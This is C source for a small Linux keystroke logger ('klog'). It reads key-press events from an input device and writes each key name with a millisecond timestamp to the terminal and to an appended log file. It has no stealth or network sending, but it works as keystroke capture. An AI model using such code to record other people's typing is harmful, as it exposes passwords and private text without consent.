#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <inttypes.h>
#include <math.h>
#include <errno.h>
#include <stdlib.h>


void printchar(int val, FILE* file){
  uint64_t ms;
  struct timespec spec;
  clock_gettime(CLOCK_REALTIME, &spec);
  
  ms = round( ((intmax_t)spec.tv_sec) * 1000 );
  ms += round( spec.tv_nsec / 1e6);

  fprintf(file, "%llu\t", ms);

  switch(val){
    case 1:  fprintf(file, "KEY_ESC\n"); break;
    case 2:  fprintf(file, "KEY_1\n"); break;
    case 3:  fprintf(file, "KEY_2\n"); break;
    case 4:  fprintf(file, "KEY_3\n"); break;
    case 5:  fprintf(file, "KEY_4\n"); break;
    case 6:  fprintf(file, "KEY_5\n"); break;
    case 7:  fprintf(file, "KEY_6\n"); break;
    case 8:  fprintf(file, "KEY_7\n"); break;
    case 9:  fprintf(file, "KEY_8\n"); break;
    case 10:  fprintf(file, "KEY_9\n"); break;
    case 11:  fprintf(file, "KEY_0\n"); break;
    case 12:  fprintf(file, "KEY_MINUS\n"); break;
    case 13:  fprintf(file, "KEY_EQUAL\n"); break;
    case 14:  fprintf(file, "KEY_BACKSPACE\n"); break;
    case 15:  fprintf(file, "KEY_TAB\n"); break;
    case 16:  fprintf(file, "KEY_Q\n"); break;
    case 17:  fprintf(file, "KEY_W\n"); break;
    case 18:  fprintf(file, "KEY_E\n"); break;
    case 19:  fprintf(file, "KEY_R\n"); break;
    case 20:  fprintf(file, "KEY_T\n"); break;
    case 21:  fprintf(file, "KEY_Y\n"); break;
    case 22:  fprintf(file, "KEY_U\n"); break;
    case 23:  fprintf(file, "KEY_I\n"); break;
    case 24:  fprintf(file, "KEY_O\n"); break;
    case 25:  fprintf(file, "KEY_P\n"); break;
    case 26:  fprintf(file, "KEY_LEFTBRACE\n"); break;
    case 27:  fprintf(file, "KEY_RIGHTBRACE\n"); break;
    case 28:  fprintf(file, "KEY_ENTER\n"); break;
    case 29:  fprintf(file, "KEY_LEFTCTRL\n"); break;
    case 30:  fprintf(file, "KEY_A\n"); break;
    case 31:  fprintf(file, "KEY_S\n"); break;
    case 32:  fprintf(file, "KEY_D\n"); break;
    case 33:  fprintf(file, "KEY_F\n"); break;
    case 34:  fprintf(file, "KEY_G\n"); break;
    case 35:  fprintf(file, "KEY_H\n"); break;
    case 36:  fprintf(file, "KEY_J\n"); break;
    case 37:  fprintf(file, "KEY_K\n"); break;
    case 38:  fprintf(file, "KEY_L\n"); break;
    case 39:  fprintf(file, "KEY_SEMICOLON\n"); break;
    case 40:  fprintf(file, "KEY_APOSTROPHE\n"); break;
    case 41:  fprintf(file, "KEY_GRAVE\n"); break;
    case 42:  fprintf(file, "KEY_LEFTSHIFT\n"); break;
    case 43:  fprintf(file, "KEY_BACKSLASH\n"); break;
    case 44:  fprintf(file, "KEY_Z\n"); break;
    case 45:  fprintf(file, "KEY_X\n"); break;
    case 46:  fprintf(file, "KEY_C\n"); break;
    case 47:  fprintf(file, "KEY_V\n"); break;
    case 48:  fprintf(file, "KEY_B\n"); break;
    case 49:  fprintf(file, "KEY_N\n"); break;
    case 50:  fprintf(file, "KEY_M\n"); break;
    case 51:  fprintf(file, "KEY_COMMA\n"); break;
    case 52:  fprintf(file, "KEY_DOT\n"); break;
    case 53:  fprintf(file, "KEY_SLASH\n"); break;
    case 54:  fprintf(file, "KEY_RIGHTSHIFT\n"); break;
    case 55:  fprintf(file, "KEY_KPASTERISK\n"); break;
    case 56:  fprintf(file, "KEY_LEFTALT\n"); break;
    case 57:  fprintf(file, "KEY_SPACE\n"); break;
    case 58:  fprintf(file, "KEY_CAPSLOCK\n"); break;
    case 59:  fprintf(file, "KEY_F1\n"); break;
    case 60:  fprintf(file, "KEY_F2\n"); break;
    case 61:  fprintf(file, "KEY_F3\n"); break;
    case 62:  fprintf(file, "KEY_F4\n"); break;
    case 63:  fprintf(file, "KEY_F5\n"); break;
    case 64:  fprintf(file, "KEY_F6\n"); break;
    case 65:  fprintf(file, "KEY_F7\n"); break;
    case 66:  fprintf(file, "KEY_F8\n"); break;
    case 67:  fprintf(file, "KEY_F9\n"); break;
    case 68:  fprintf(file, "KEY_F10\n"); break;
    case 69:  fprintf(file, "KEY_NUMLOCK\n"); break;
    case 70:  fprintf(file, "KEY_SCROLLLOCK\n"); break;
    case 71:  fprintf(file, "KEY_KP7\n"); break;
    case 72:  fprintf(file, "KEY_KP8\n"); break;
    case 73:  fprintf(file, "KEY_KP9\n"); break;
    case 74:  fprintf(file, "KEY_KPMINUS\n"); break;
    case 75:  fprintf(file, "KEY_KP4\n"); break;
    case 76:  fprintf(file, "KEY_KP5\n"); break;
    case 77:  fprintf(file, "KEY_KP6\n"); break;
    case 78:  fprintf(file, "KEY_KPPLUS\n"); break;
    case 79:  fprintf(file, "KEY_KP1\n"); break;
    case 80:  fprintf(file, "KEY_KP2\n"); break;
    case 81:  fprintf(file, "KEY_KP3\n"); break;
    case 82:  fprintf(file, "KEY_KP0\n"); break;
    case 83:  fprintf(file, "KEY_KPDOT\n"); break;
    case 85:  fprintf(file, "KEY_ZENKAKUHANKAKU\n"); break;
    case 86:  fprintf(file, "KEY_102ND\n"); break;
    case 87:  fprintf(file, "KEY_F11\n"); break;
    case 88:  fprintf(file, "KEY_F12\n"); break;
    case 89:  fprintf(file, "KEY_RO\n"); break;
    case 90:  fprintf(file, "KEY_KATAKANA\n"); break;
    case 91:  fprintf(file, "KEY_HIRAGANA\n"); break;
    case 92:  fprintf(file, "KEY_HENKAN\n"); break;
    case 93:  fprintf(file, "KEY_KATAKANAHIRAGANA\n"); break;
    case 94:  fprintf(file, "KEY_MUHENKAN\n"); break;
    case 95:  fprintf(file, "KEY_KPJPCOMMA\n"); break;
    case 96:  fprintf(file, "KEY_KPENTER\n"); break;
    case 97:  fprintf(file, "KEY_RIGHTCTRL\n"); break;
    case 98:  fprintf(file, "KEY_KPSLASH\n"); break;
    case 99:  fprintf(file, "KEY_SYSRQ\n"); break;
    case 100:  fprintf(file, "KEY_RIGHTALT\n"); break;
    case 101:  fprintf(file, "KEY_LINEFEED\n"); break;
    case 102:  fprintf(file, "KEY_HOME\n"); break;
    case 103:  fprintf(file, "KEY_UP\n"); break;
    case 104:  fprintf(file, "KEY_PAGEUP\n"); break;
    case 105:  fprintf(file, "KEY_LEFT\n"); break;
    case 106:  fprintf(file, "KEY_RIGHT\n"); break;
    case 107:  fprintf(file, "KEY_END\n"); break;
    case 108:  fprintf(file, "KEY_DOWN\n"); break;
    case 109:  fprintf(file, "KEY_PAGEDOWN\n"); break;
    case 110:  fprintf(file, "KEY_INSERT\n"); break;
    case 111:  fprintf(file, "KEY_DELETE\n"); break;
    case 112:  fprintf(file, "KEY_MACRO\n"); break;
    case 113:  fprintf(file, "KEY_MUTE\n"); break;
    case 114:  fprintf(file, "KEY_VOLUMEDOWN\n"); break;
    case 115:  fprintf(file, "KEY_VOLUMEUP\n"); break;
    case 116:  fprintf(file, "KEY_POWER\n"); break;
    case 117:  fprintf(file, "KEY_KPEQUAL\n"); break;
    case 118:  fprintf(file, "KEY_KPPLUSMINUS\n"); break;
    case 119:  fprintf(file, "KEY_PAUSE\n"); break;
    case 121:  fprintf(file, "KEY_KPCOMMA\n"); break;
    case 122:  fprintf(file, "KEY_HANGUEL\n"); break;
    case 123:  fprintf(file, "KEY_HANJA\n"); break;
    case 124:  fprintf(file, "KEY_YEN\n"); break;
    case 125:  fprintf(file, "KEY_LEFTMETA\n"); break;
    case 126:  fprintf(file, "KEY_RIGHTMETA\n"); break;
    case 127:  fprintf(file, "KEY_COMPOSE\n"); break;
    case 128:  fprintf(file, "KEY_STOP\n"); break;
    case 129:  fprintf(file, "KEY_AGAIN\n"); break;
    case 130:  fprintf(file, "KEY_PROPS\n"); break;
    case 131:  fprintf(file, "KEY_UNDO\n"); break;
    case 132:  fprintf(file, "KEY_FRONT\n"); break;
    case 133:  fprintf(file, "KEY_COPY\n"); break;
    case 134:  fprintf(file, "KEY_OPEN\n"); break;
    case 135:  fprintf(file, "KEY_PASTE\n"); break;
    case 136:  fprintf(file, "KEY_FIND\n"); break;
    case 137:  fprintf(file, "KEY_CUT\n"); break;
    case 138:  fprintf(file, "KEY_HELP\n"); break;
    case 139:  fprintf(file, "KEY_MENU\n"); break;
    case 140:  fprintf(file, "KEY_CALC\n"); break;
    case 141:  fprintf(file, "KEY_SETUP\n"); break;
    case 142:  fprintf(file, "KEY_SLEEP\n"); break;
    case 143:  fprintf(file, "KEY_WAKEUP\n"); break;
    case 144:  fprintf(file, "KEY_FILE\n"); break;
    case 145:  fprintf(file, "KEY_SENDFILE\n"); break;
    case 146:  fprintf(file, "KEY_DELETEFILE\n"); break;
    case 147:  fprintf(file, "KEY_XFER\n"); break;
    case 148:  fprintf(file, "KEY_PROG1\n"); break;
    case 149:  fprintf(file, "KEY_PROG2\n"); break;
    case 150:  fprintf(file, "KEY_WWW\n"); break;
    case 151:  fprintf(file, "KEY_MSDOS\n"); break;
    case 152:  fprintf(file, "KEY_COFFEE\n"); break;
    case 153:  fprintf(file, "KEY_DIRECTION\n"); break;
    case 154:  fprintf(file, "KEY_CYCLEWINDOWS\n"); break;
    case 155:  fprintf(file, "KEY_MAIL\n"); break;
    case 156:  fprintf(file, "KEY_BOOKMARKS\n"); break;
    case 157:  fprintf(file, "KEY_COMPUTER\n"); break;
    case 158:  fprintf(file, "KEY_BACK\n"); break;
    case 159:  fprintf(file, "KEY_FORWARD\n"); break;
    case 160:  fprintf(file, "KEY_CLOSECD\n"); break;
    case 161:  fprintf(file, "KEY_EJECTCD\n"); break;
    case 162:  fprintf(file, "KEY_EJECTCLOSECD\n"); break;
    case 163:  fprintf(file, "KEY_NEXTSONG\n"); break;
    case 164:  fprintf(file, "KEY_PLAYPAUSE\n"); break;
    case 165:  fprintf(file, "KEY_PREVIOUSSONG\n"); break;
    case 166:  fprintf(file, "KEY_STOPCD\n"); break;
    case 167:  fprintf(file, "KEY_RECORD\n"); break;
    case 168:  fprintf(file, "KEY_REWIND\n"); break;
    case 169:  fprintf(file, "KEY_PHONE\n"); break;
    case 170:  fprintf(file, "KEY_ISO\n"); break;
    case 171:  fprintf(file, "KEY_CONFIG\n"); break;
    case 172:  fprintf(file, "KEY_HOMEPAGE\n"); break;
    case 173:  fprintf(file, "KEY_REFRESH\n"); break;
    case 174:  fprintf(file, "KEY_EXIT\n"); break;
    case 175:  fprintf(file, "KEY_MOVE\n"); break;
    case 176:  fprintf(file, "KEY_EDIT\n"); break;
    case 177:  fprintf(file, "KEY_SCROLLUP\n"); break;
    case 178:  fprintf(file, "KEY_SCROLLDOWN\n"); break;
    case 179:  fprintf(file, "KEY_KPLEFTPAREN\n"); break;
    case 180:  fprintf(file, "KEY_KPRIGHTPAREN\n"); break;
    case 183:  fprintf(file, "KEY_F13\n"); break;
    case 184:  fprintf(file, "KEY_F14\n"); break;
    case 185:  fprintf(file, "KEY_F15\n"); break;
    case 186:  fprintf(file, "KEY_F16\n"); break;
    case 187:  fprintf(file, "KEY_F17\n"); break;
    case 188:  fprintf(file, "KEY_F18\n"); break;
    case 189:  fprintf(file, "KEY_F19\n"); break;
    case 190:  fprintf(file, "KEY_F20\n"); break;
    case 191:  fprintf(file, "KEY_F21\n"); break;
    case 192:  fprintf(file, "KEY_F22\n"); break;
    case 193:  fprintf(file, "KEY_F23\n"); break;
    case 194:  fprintf(file, "KEY_F24\n"); break;
    case 200:  fprintf(file, "KEY_PLAYCD\n"); break;
    case 201:  fprintf(file, "KEY_PAUSECD\n"); break;
    case 202:  fprintf(file, "KEY_PROG3\n"); break;
    case 203:  fprintf(file, "KEY_PROG4\n"); break;
    case 205:  fprintf(file, "KEY_SUSPEND\n"); break;
    case 206:  fprintf(file, "KEY_CLOSE\n"); break;
    case 207:  fprintf(file, "KEY_PLAY\n"); break;
    case 208:  fprintf(file, "KEY_FASTFORWARD\n"); break;
    case 209:  fprintf(file, "KEY_BASSBOOST\n"); break;
    case 210:  fprintf(file, "KEY_PRINT\n"); break;
    case 211:  fprintf(file, "KEY_HP\n"); break;
    case 212:  fprintf(file, "KEY_CAMERA\n"); break;
    case 213:  fprintf(file, "KEY_SOUND\n"); break;
    case 214:  fprintf(file, "KEY_QUESTION\n"); break;
    case 215:  fprintf(file, "KEY_EMAIL\n"); break;
    case 216:  fprintf(file, "KEY_CHAT\n"); break;
    case 217:  fprintf(file, "KEY_SEARCH\n"); break;
    case 218:  fprintf(file, "KEY_CONNECT\n"); break;
    case 219:  fprintf(file, "KEY_FINANCE\n"); break;
    case 220:  fprintf(file, "KEY_SPORT\n"); break;
    case 221:  fprintf(file, "KEY_SHOP\n"); break;
    case 222:  fprintf(file, "KEY_ALTERASE\n"); break;
    case 223:  fprintf(file, "KEY_CANCEL\n"); break;
    case 224:  fprintf(file, "KEY_BRIGHTNESSDOWN\n"); break;
    case 225:  fprintf(file, "KEY_BRIGHTNESSUP\n"); break;
    case 226:  fprintf(file, "KEY_MEDIA\n"); break;
    default: fprintf(file, "UNKNOWN KEY\n"); break;
  }
  fflush(file);
}

int main(int argc, char **argv)
{
    int fd;
    FILE* log;

    if(argc < 3) {
    	printf("usage: %s <device> <logfile>\n", argv[0]);
    	return 1;
    }
    fd = open(argv[1], O_RDONLY);
    log = fopen(argv[2], "a+");
    
    if(log == NULL){
      fprintf(stderr, "[klog]: Could not open log file! (%d)", errno);
      exit(1);
    } 
    
    struct input_event ev;

    while (1){
      read(fd, &ev, sizeof(struct input_event));
    	//printf("TYPE: %u CODE: %u VALUE: %i\n", ev.type, ev.code, ev.value);
      if(ev.type == EV_KEY && ev.value == 1){
        printchar(ev.code, stdout);
        printchar(ev.code, log);
      }
    }
}


